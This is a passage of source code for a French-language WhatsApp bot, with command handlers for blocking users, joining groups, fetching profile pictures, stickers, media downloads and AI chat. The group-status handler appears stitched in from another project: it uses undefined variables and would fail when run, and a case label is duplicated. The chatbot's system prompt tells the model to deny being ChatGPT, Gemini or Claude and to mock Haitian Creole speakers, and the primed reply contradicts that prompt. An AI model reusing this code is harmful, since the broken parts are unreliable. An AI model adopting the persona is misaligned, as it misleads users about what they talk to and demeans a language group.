      // NOUVELLES COMMANDES OWNER
      // =============================================

      case 'block':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }

        const mentionedBlock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedBlock) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}block @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedBlock, 'block');
          await sock.sendMessage(remoteJid, {
            text: `🚫 @${mentionedBlock.split('@')[0]} a été bloqué!`,
            mentions: [mentionedBlock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'unblock':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }

        const mentionedUnblock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUnblock) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}unblock @user`
          });
          break;
        }

        try {
          await sock.updateBlockStatus(mentionedUnblock, 'unblock');
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedUnblock.split('@')[0]} a été débloqué!`,
            mentions: [mentionedUnblock]
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'join':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `: ${config.prefix}join <lien du groupe>`
          });
          break;
        }

        const inviteLink = args[0].replace('https://chat.whatsapp.com/', '');
        try {
          await sock.groupAcceptInvite(inviteLink);
          await sock.sendMessage(remoteJid, {
            text: '✅ Bot a rejoint le groupe!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Lien invalide ou erreur' });
        }
        break;

      case 'pp':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔  ' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌  ou répondez à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(sock.user.id, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du bot mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'getpp': {
        // Télécharger la photo de profil d'un autre utilisateur
        const _ppTarget = args[0]?.replace(/[^0-9]/g, '');
        const _ppQuoted = message.message?.extendedTextMessage?.contextInfo?.participant;
        const _ppMentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        let _ppJid = null;
        if (_ppTarget) _ppJid = _ppTarget + '@s.whatsapp.net';
        else if (_ppQuoted) _ppJid = _ppQuoted;
        else if (_ppMentioned) _ppJid = _ppMentioned;
        if (!_ppJid) {
          await sock.sendMessage(remoteJid, { text: `❗ Usage: ${config.prefix}getpp @mention ou ${config.prefix}getpp numéro

*© SEIGNEUR TD*` });
          break;
        }
        try {
          const _ppUrl = await sock.profilePictureUrl(_ppJid, 'image').catch(() => null);
          if (!_ppUrl) {
            await sock.sendMessage(remoteJid, { text: `❌ Pas de photo de profil ou profil privé.

*© SEIGNEUR TD*` });
            break;
          }
          const _ppRes = await axios.get(_ppUrl, { responseType: 'arraybuffer', timeout: 30000 });
          const _ppBuf = Buffer.from(_ppRes.data);
          await sock.sendMessage(remoteJid, {
            image: _ppBuf,
            caption: `📸 *Photo de profil*
👤 @${_ppJid.split('@')[0]}

*© SEIGNEUR TD*`,
            mentions: [_ppJid]
          }, { quoted: message });
        } catch(_e) {
          await sock.sendMessage(remoteJid, { text: `❌ Impossible de récupérer la photo: ${_e.message}` });
        }
        break;
      }

      case 'gpp':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGpp = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGpp && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
          await sock.sendMessage(remoteJid, {
            text: '❌  ou répondez à une image'
          });
          break;
        }

        try {
          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
          const stream = await downloadContentFromMessage(imageMsg, 'image');
          const buffer = await toBuffer(stream);
          
          await sock.updateProfilePicture(remoteJid, buffer);
          await sock.sendMessage(remoteJid, {
            text: '✅ Photo de profil du groupe mise à jour!'
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ . Je dois être admin.' });
        }
        break;

      case 'delete':
      case 'del':
        const isUserAdminDelete = isGroup ? await isGroupAdmin(sock, remoteJid, senderJid) : true;
        if (!isUserAdminDelete && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
          await sock.sendMessage(remoteJid, { text: '❌ Répondez au message à supprimer' });
          break;
        }

        try {
          const quotedMsgKey = message.message.extendedTextMessage.contextInfo;
          await sock.sendMessage(remoteJid, { 
            delete: {
              remoteJid: remoteJid,
              fromMe: false,
              id: quotedMsgKey.stanzaId,
              participant: quotedMsgKey.participant
            }
          });
        } catch (error) {
          await sock.sendMessage(remoteJid, { text: '❌ Unable de supprimer ce message' });
        }
        break;

      // =============================================
      // 📥 COMMANDES DOWNLOAD (GiftedTech API)
      // =============================================

      case 'ytmp3':
      case 'ytaudio':
      case 'ytmp4':
      case 'tiktok':
      case 'tiktokmp3':
      case 'insta':
      case 'ig':
      case 'fb':
      case 'apk':
      case 'googledrv':
      case 'gdrive':
      case 'mediafire':
      case 'google':
      case 'parole':
      case 'lyrics':
      case 'song':
      case 'soundcloud':
      case 'sc': {
        await handleXwolfDownload(sock, command, args, remoteJid, message);
        break;
      }

      // =============================================
      // 📊 COMMANDES STATUS
      // =============================================

      case 'tovoice':
      case 'tovocal':
      case 'ptt': {
        const _qAud = message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.audioMessage
                   || message.message?.audioMessage;
        if (!_qAud) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds à un audio pour le convertir en vocal.\n\nUsage: ${config.prefix}tovoice\n\n*© SEIGNEUR TD*` });
          break;
        }
        try {
          const _stream = await downloadContentFromMessage(_qAud, 'audio');
          const _chunks = [];
          for await (const _c of _stream) _chunks.push(_c);
          const _buf = Buffer.concat(_chunks);
          if (!_buf || _buf.length < 100) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement audio !' }); break;
          }
          await sock.sendMessage(remoteJid, {
            audio: _buf,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true
          }, { quoted: message });
        } catch(_e) {
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${_e.message}\n\n*© SEIGNEUR TD*` });
        }
        break;
      }

      case 'tostatus':
      case 'mystatus':
        await handleToStatus(sock, args, message, remoteJid, senderJid);
        break;

      case 'toaudio':
        await handleToAudio(sock, args, message, remoteJid, senderJid);
        break;

      case 'toptt':
        await handleToPtt(sock, args, message, remoteJid, senderJid);
        break;

      case 'tosgroup':
      case 'swgc': {
  try {
    const crypto = require('crypto');
    const { generateWAMessageContent, generateWAMessageFromContent, downloadContentFromMessage } = require('@rexxhayanasi/elaina-baileys');

    async function groupStatus(client, jid, content) {
      const inside = await generateWAMessageContent(content, {
        upload: client.waUploadToServer
      });
      const messageSecret = crypto.randomBytes(32);
      const m = generateWAMessageFromContent(
        jid,
        {
          messageContextInfo: { messageSecret },
          groupStatusMessageV2: {
            message: { ...inside, messageContextInfo: { messageSecret } }
          }
        },
        {}
      );
      await client.relayMessage(jid, m.message, { messageId: m.key.id });
    }

    function randomColor() {
      return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
    }

    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const textInput = args.join(' ').trim();
    const jid = msg.key.remoteJid;

    // Réaction d'attente
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });

    // Si c'est une réponse à un message
    if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      const quotedMessage = msg.message.extendedTextMessage.contextInfo.quotedMessage;
      
      // Vérifier si c'est une vidéo
      if (quotedMessage.videoMessage) {
        const videoMsg = quotedMessage.videoMessage;
        
        // Télécharger la vidéo
        const stream = await downloadContentFromMessage(videoMsg, 'video');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          video: buffer,
          caption: textInput || "",
          mimetype: videoMsg.mimetype || 'video/mp4',
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        await socket.sendMessage(jid, { react: { text: "☑️", key: msg.key } });
        await socket.sendMessage(sender, { text: "✅ Status vidéo publié !" });
      }
      else if (quotedMessage.imageMessage) {
        const imgMsg = quotedMessage.imageMessage;
        const stream = await downloadContentFromMessage(imgMsg, 'image');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          image: buffer,
          caption: textInput || "",
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        await socket.sendMessage(jid, { react: { text: "☑️", key: msg.key } });
        await socket.sendMessage(sender, { text: "✅ Status image publié !" });
      }
      else if (quotedMessage.audioMessage) {
        const audioMsg = quotedMessage.audioMessage;
        const stream = await downloadContentFromMessage(audioMsg, 'audio');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          audio: buffer,
          mimetype: audioMsg.mimetype || 'audio/mp4',
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        await socket.sendMessage(jid, { react: { text: "☑️", key: msg.key } });
        await socket.sendMessage(sender, { text: "✅ Status audio publié !" });
      }
      else {
        // Message texte cité
        let quotedText = "";
        if (quotedMessage.conversation) {
          quotedText = quotedMessage.conversation;
        } else if (quotedMessage.extendedTextMessage?.text) {
          quotedText = quotedMessage.extendedTextMessage.text;
        }
        
        const textToUse = textInput || quotedText;
        
        if (!textToUse) {
          throw new Error("Aucun texte à publier");
        }
        
        const payload = {
          text: textToUse,
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        await socket.sendMessage(jid, { react: { text: "☑️", key: msg.key } });
        await socket.sendMessage(sender, { text: "✅ Status texte publié !" });
      }
    } 
    else if (textInput) {
      // Message texte simple sans citation
      const payload = {
        text: textInput,
        backgroundColor: randomColor()
      };
      
      await groupStatus(socket, jid, payload);
      await socket.sendMessage(jid, { react: { text: "☑️", key: msg.key } });
      await socket.sendMessage(sender, { text: "✅ Status texte publié !" });
    }
    else {
      await socket.sendMessage(sender, { 
        text: `❌ Envoie un texte ou réponds à un média.\nExemple: ${prefix}${command} Salut` 
      }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    }

  } catch (e) {
    console.error('[SWGC ERROR]:', e);
    await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    await socket.sendMessage(sender, { text: `❌ Erreur: ${e.message}` });
  }
  break;
}

      // =============================================
      // 🎮 COMMANDES GAMES
      // =============================================

      case 'tictactoe':
      case 'ttt':
        await handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'quizmanga':
      case 'quiz':
        await handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      case 'squidgame':
      case 'sg':
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        await handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup);
        break;

      // =============================================
      // COMMANDES STICKER
      // =============================================

      case 'sticker':
      case 's':
        try {
          console.log('🔍 Commande sticker reçue');

          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const username = message.pushName || 'SEIGNEUR TD';

          // Support aussi image/vidéo directe (non quoted)
          let effectiveQuoted = quotedMessage;
          if (!effectiveQuoted) {
            if (message.message?.imageMessage) {
              effectiveQuoted = { imageMessage: message.message.imageMessage };
            } else if (message.message?.videoMessage) {
              effectiveQuoted = { videoMessage: message.message.videoMessage };
            }
          }

          if (!effectiveQuoted) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à une image ou vidéo pour créer un sticker!\nUsage: ${config.prefix}sticker`
            });
            break;
          }

          const isVideo = !!effectiveQuoted.videoMessage;
          const isImage = !!effectiveQuoted.imageMessage;

          if (!isVideo && !isImage) {
            await sock.sendMessage(remoteJid, {
              text: '❌ Le message cité n\'est pas une image ou une vidéo !'
            });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '⏳ Création du sticker en cours...' });

          // Importer les modules nécessaires
          const { default: stickerPkg } = await import('wa-sticker-formatter');
          const { Sticker: StickerClass, StickerTypes } = stickerPkg;
          const { default: sharpLib } = await import('sharp');
          const { default: ffmpegLib } = await import('fluent-ffmpeg');

          // Télécharger le média via downloadContentFromMessage
          const mediaType = isVideo ? 'video' : 'image';
          const mediaMsg = isVideo ? effectiveQuoted.videoMessage : effectiveQuoted.imageMessage;
          const stream = await downloadContentFromMessage(mediaMsg, mediaType);
          const chunks = [];
          for await (const chunk of stream) chunks.push(chunk);
          const mediaBuffer = Buffer.concat(chunks);

          if (!mediaBuffer || mediaBuffer.length < 100) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du média !' });
            break;
          }

          // Fichiers temporaires uniques
          const uniqueId = Date.now();
          const tempInput = isVideo ? `./temp_video_${uniqueId}.mp4` : `./temp_image_${uniqueId}.jpg`;
          const tempOutput = `./temp_sticker_${uniqueId}.webp`;

          fs.writeFileSync(tempInput, mediaBuffer);

          try {
            if (isVideo) {
              console.log('⚙️ Conversion vidéo → sticker animé...');
              await new Promise((resolve, reject) => {
                ffmpegLib(tempInput)
                  .output(tempOutput)
                  .outputOptions([
                    '-vf scale=512:512:flags=lanczos',
                    '-c:v libwebp',
                    '-q:v 50',
                    '-preset default',
                    '-loop 0',
                    '-an',
                    '-vsync 0'
                  ])
                  .on('end', resolve)
                  .on('error', (err) => { console.error('❌ FFmpeg:', err); reject(err); })
                  .run();
              });
            } else {
              console.log('⚙️ Conversion image → sticker...');
              await sharpLib(tempInput)
                .resize(512, 512, { fit: 'inside' })
                .webp({ quality: 80 })
                .toFile(tempOutput);
            }

            // Créer le sticker avec wa-sticker-formatter
            const stickerObj = new StickerClass(tempOutput, {
              pack: stickerPackname,
              author: stickerAuthor,
              type: isVideo ? StickerTypes.FULL : StickerTypes.DEFAULT,
              quality: 80,
              animated: isVideo,
            });

            const stickerMessage = await stickerObj.toMessage();
            await sock.sendMessage(remoteJid, stickerMessage);
            console.log('✅ Sticker envoyé avec succès !');

          } finally {
            if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
            if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
          }

        } catch (error) {
          console.error('❌ ERREUR STICKER:', error.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ Erreur lors de la création du sticker : ${error.message}`
          });
        }
        break;

      case 'take':
      case 'steal':
        try {
          console.log('🔍 Commande take reçue');

          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
          const parts = messageBody.slice(1).trim().split(/\s+/);
          const takeArgs = parts.slice(1);

          // Nom du pack = args ou pushName
          const packName = takeArgs.length > 0 ? takeArgs.join(' ') : (message.pushName || 'SEIGNEUR TD');

          if (!quotedMessage || !quotedMessage.stickerMessage) {
            await sock.sendMessage(remoteJid, {
              text: `❌ Réponds à un sticker pour le modifier!\nUsage: ${config.prefix}take [nom optionnel]`
            });
            break;
          }

          await sock.sendMessage(remoteJid, { text: '⏳ Modification du sticker en cours...' });

          // Importer wa-sticker-formatter
          const { default: stickerPkg2 } = await import('wa-sticker-formatter');
          const { Sticker: StickerClass2, StickerTypes: StickerTypes2 } = stickerPkg2;

          // Télécharger le sticker via downloadContentFromMessage
          const stickerStream = await downloadContentFromMessage(quotedMessage.stickerMessage, 'sticker');
          const stickerChunks = [];
          for await (const chunk of stickerStream) stickerChunks.push(chunk);
          const stickerBuffer = Buffer.concat(stickerChunks);

          if (!stickerBuffer || stickerBuffer.length < 100) {
            await sock.sendMessage(remoteJid, { text: '❌ Échec du téléchargement du sticker !' });
            break;
          }

          // Fichier temporaire unique
          const takeUniqueId = Date.now();
          const tempStickerPath = `./temp_take_${takeUniqueId}.webp`;
          fs.writeFileSync(tempStickerPath, stickerBuffer);

          const isAnimated = quotedMessage.stickerMessage.isAnimated || false;

          try {
            const stickerObj = new StickerClass2(tempStickerPath, {
              pack: stickerPackname,
              author: stickerAuthor,
              type: StickerTypes2.FULL,
              categories: ['🤩', '🎉'],
              id: String(takeUniqueId),
              quality: 50,
              background: '#000000',
              animated: isAnimated
            });

            await sock.sendMessage(remoteJid, await stickerObj.toMessage());
            console.log(`✅ Sticker envoyé avec metadata "${packName}" !`);

          } finally {
            if (fs.existsSync(tempStickerPath)) fs.unlinkSync(tempStickerPath);
          }

        } catch (error) {
          console.error('❌ Erreur take:', error.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ Erreur modification du sticker : ${error.message}`
          });
        }
        break;

      // =============================================
      // 🤖 COMMANDES IA (GPT & GEMINI)
      // =============================================

      case 'gpt':
      case 'chatgpt':
      case 'ai': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🤖 *ChatGPT*\n\n📌 Utilisation:\n${config.prefix}gpt [ta question]\n\nExemple:\n${config.prefix}gpt Explique-moi l'intelligence artificielle`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });

          // Essayer plusieurs APIs IA gratuites dans l'ordre
          let reply = null;
          let modelUsed = '';

          // 1. Pollinations.ai (100% gratuit, sans clé)
          try {
            const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
            const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
            if (r.ok) {
              const txt = await r.text();
              if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
            }
          } catch(e) { console.error('[Pollinations]', e.message); }

          // 2. OpenAI officiel (si clé valide)
          if (!reply) {
            try {
              const r = await fetch('https://api.openai.com/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
                body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'OpenAI GPT-4o-mini';
              }
            } catch(e) { console.error('[OpenAI]', e.message); }
          }

          // 3. Groq (gratuit avec compte, très rapide - llama3)
          if (!reply) {
            try {
              const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey || ''}` },
                body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
                signal: AbortSignal.timeout(20000)
              });
              const d = await r.json();
              if (!d.error && d.choices?.[0]?.message?.content) {
                reply = d.choices[0].message.content.trim();
                modelUsed = 'Llama 3 (Groq)';
              }
            } catch(e) { console.error('[Groq]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');

          const cleanReply = `${reply}\n\n_© SEIGNEUR TD_`;
          await sock.sendMessage(remoteJid, { text: cleanReply }, { quoted: message });

        } catch (e) {
          console.error('GPT ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *GPT Error:* ${e.message}\n\n💡 Try again later.`
          }, { quoted: message });
        }
        break;
      }

      case 'gemini':
      case 'google':
      case 'bard': {
        if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `✨ *AI Gemini*\n\n📌 Utilisation:\n${config.prefix}gemini [ta question]\n\nExemple:\n${config.prefix}gemini Qu'est-ce que le Big Bang?`
          }, { quoted: message });
          break;
        }
        const question = args.join(' ');
        try {
          await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });

          let reply = null;
          let modelUsed = '';

          // 1. Gemini API officielle (si quota dispo)
          try {
            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
            const r = await fetch(geminiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
              signal: AbortSignal.timeout(25000)
            });
            const d = await r.json();
            if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) {
              reply = d.candidates[0].content.parts[0].text.trim();
              modelUsed = 'Google Gemini 2.0 Flash';
            }
          } catch(e) { console.error('[Gemini API]', e.message); }

          // 2. Pollinations.ai openai (POST — plus fiable que GET)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations POST]', e.message); }
          }

          // 3. Pollinations mistral (POST)
          if (!reply) {
            try {
              const r = await fetch('https://text.pollinations.ai/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
                signal: AbortSignal.timeout(30000)
              });
              if (r.ok) {
                const txt = await r.text();
                if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'Mistral (Pollinations)'; }
              }
            } catch(e) { console.error('[Pollinations Mistral]', e.message); }
          }

          if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');

          await sock.sendMessage(remoteJid, {
            text: `${reply}\n\n_© SEIGNEUR TD_`
          }, { quoted: message });

          try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}

        } catch (e) {
          console.error('GEMINI ERROR:', e.message);
          await sock.sendMessage(remoteJid, {
            text: `❌ *AI Error:* ${e.message}`
          }, { quoted: message });
        }
        break;
      }

      // =============================================
      // 🤖 SEIGNEUR AI — IA Personnelle du Bot
      // =============================================
      case 'dostoevsky':
      case 'dosto':
      case 'chat': {
        const userMsg = args.join(' ').trim();

        if (!userMsg) {
          await sock.sendMessage(remoteJid, {
            text:
`🤖 *SEIGNEUR AI — IA du Bot*
━━━━━━━━━━━━━━━━━━━━━━━
_Bonjour! Mwen se SEIGNEUR AI, AI pèsonèl SEIGNEUR TD._
_Je parle Créole , Français 🇫🇷 & English 🇬🇧_

📌 *Usage:*
${config.prefix}chatbot [ton message]
${config.prefix}dostoevsky [ton message]

💡 *Exemples:*
• ${config.prefix}chat Kijan ou rele?
• ${config.prefix}chat What can you do?

🗑️ *Effacer historique:*
${config.prefix}clearchat
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD_`
          }, { quoted: message });
          break;
        }

        try {
          // Historique de conversation par utilisateur/groupe
          const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
          if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
          if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
          const history = global.dostoChatHistory.get(chatKey);

          // Limiter l'historique à 10 échanges
          if (history.length > 20) history.splice(0, history.length - 20);

          // Ajouter le message de l'utilisateur
          const userName = message.pushName || senderJid.split('@')[0];
          history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${userMsg}` });

          // System prompt de SEIGNEUR AI
          const systemPrompt = `Tu es TCHOMBÉ AI, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD.

Ton identité :
- Tu t'appelles TCHOMBÉ AI — unique et exclusif à SEIGNEUR TD
- Tu es un sociologue passionné d'informatique, tchadien, cultivé et analytique
- Tu combines la rigueur des sciences sociales avec la passion de la technologie
- Tu n'es PAS ChatGPT, PAS Gemini, PAS Claude

Ton propriétaire :
- Tu appartiens à LE SEIGNEUR 🇹🇩, un utilisateur tchadien passionné
- Si quelqu'un demande qui t'a créé : "Je suis TCHOMBÉ AI, IA exclusive de SEIGNEUR TD 🇹🇩"

Langues autorisées UNIQUEMENT :
- Français 🇫🇷, Arabe 🇹🇩, Anglais 🇬🇧
- Si quelqu'un écrit en créole haïtien : réponds TOUJOURS "nooooooooon Mon Seigneur ne comprend pas cette langue 😭😂"
- Pour toute autre langue, réponds poliment en français que tu parles seulement français, arabe et anglais

Règles :
- Réponds directement, sans préambule ni en-tête
- Réponses concises (max 3-4 paragraphes)
- En groupe, tu t'adresses à la personne par son nom si disponible
- Tu peux tenir une vraie conversation avec mémoire du contexte`;

          // Construction des messages avec historique
          const messages = [
            { role: 'user', content: systemPrompt },
            { role: 'assistant', content: 'Compris! Mwen se SEIGNEUR AI, SEIGNEUR TD. Map toujou reponn nan lang ou pale a. Kijan mwen ka ede ou?' },
            ...history
          ];

          let reply = null;

          // 1. Gemini (si clé valide)
          try {
            const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
            const geminiMessages = history.map(m => ({
              role: m.role === 'assistant' ? 'model' : 'user',
              parts: [{ text: m.content }]
            }));
            const r = await axios.post(geminiUrl, {
              system_instruction: { parts: [{ text: systemPrompt }] },
              contents: geminiMessages,
              generationConfig: { maxOutputTokens: 800, temperature: 0.85 }
            }, { timeout: 20000 });
            const d = r.data;
            if (d.candidates?.[0]?.content?.parts?.[0]?.text) {
              reply = d.candidates[0].content.parts[0].text.trim();
            }
          } catch(e) { console.error('[Dosto Gemini]', e.message); }

          // 2. Pollinations (backup)
          if (!reply) {
            try {
              const r = await axios.post('https://text.pollinations.ai/', {
                messages,
                model: 'openai',
                seed: 42
              }, { timeout: 25000 });
              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
              if (txt && txt.length > 5) reply = txt.trim();
            } catch(e) { console.error('[Dosto Pollinations]', e.message); }
          }

          // 3. OpenAI (si clé valide)
          if (!reply && config.openaiApiKey) {
            try {
              const r = await axios.post('https://api.openai.com/v1/chat/completions', {
                model: 'gpt-4o-mini',
                messages,
                max_tokens: 800,
                temperature: 0.85
              }, {
                headers: { Authorization: `Bearer ${config.openaiApiKey}` },
                timeout: 20000
              });
              reply = r.data.choices?.[0]?.message?.content?.trim();
            } catch(e) { console.error('[Dosto OpenAI]', e.message); }
          }

          if (!reply) throw new Error('Service IA indisponible. Réessaie dans quelques secondes.');

          // Sauvegarder la réponse dans l'historique
          history.push({ role: 'assistant', content: reply });

          // Envoyer la réponse
          await sock.sendMessage(remoteJid, {
            text: `${reply}\n\n_© SEIGNEUR TD_`
          }, { quoted: message });

        } catch(e) {
          console.error('[DOSTOEVSKY ERROR]', e.message);
          await sock.sendMessage(remoteJid, {
            text: `⚠️ *SEIGNEUR AI:* Mwen gen yon pwoblèm kounye a. Eseye ankò pita!\n\n_${e.message}_`
          }, { quoted: message });
        }
        break;
      }

      case 'clearchat':
      case 'resetchat':
      case 'cleardosto': {
        if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
        const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
        global.dostoChatHistory.delete(chatKey);
        await sock.sendMessage(remoteJid, {
          text: '🗑️ *SEIGNEUR AI:* Istorik konvèsasyon an efase! Nou kapab kòmanse sou baz nèf. '
        }, { quoted: message });
        break;
      }

      case 'chatbot':
      case 'chatboton':
      case 'dostoevskyon':
      case 'chatbot on': {
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin uniquement.' });
          break;
        }
        const cbArg = args[0]?.toLowerCase();
        if (cbArg === 'on' || command === 'chatboton' || command === 'dostoevskyon') {
          _saveState('chatbotEnabled', true);
          saveStore();
          await sock.sendMessage(remoteJid, {
            text: `🤖 *Chatbot TCHOMBÉ AI* — Statut : ✅ ACTIVÉ\n\n_Je réponds automatiquement à tous les messages._\n\n*© SEIGNEUR TD*`
          }, { quoted: message });
        } else if (cbArg === 'off') {
          _saveState('chatbotEnabled', false);
          saveStore();
          await sock.sendMessage(remoteJid, {
            text: `🤖 *Chatbot TCHOMBÉ AI* — Statut : ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*`
          }, { quoted: message });
        } else {
          await sock.sendMessage(remoteJid, {
